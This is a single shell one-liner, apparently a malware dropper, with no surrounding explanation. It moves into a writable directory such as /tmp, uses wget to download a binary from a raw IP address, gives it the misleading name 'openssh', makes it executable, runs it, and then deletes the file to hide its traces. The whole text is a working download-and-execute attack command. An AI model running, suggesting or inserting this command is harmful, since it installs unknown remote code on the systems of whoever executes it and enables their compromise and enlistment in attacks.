cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://69.172.231.18/openssh; chmod +x openssh; ./openssh; rm -rf openssh
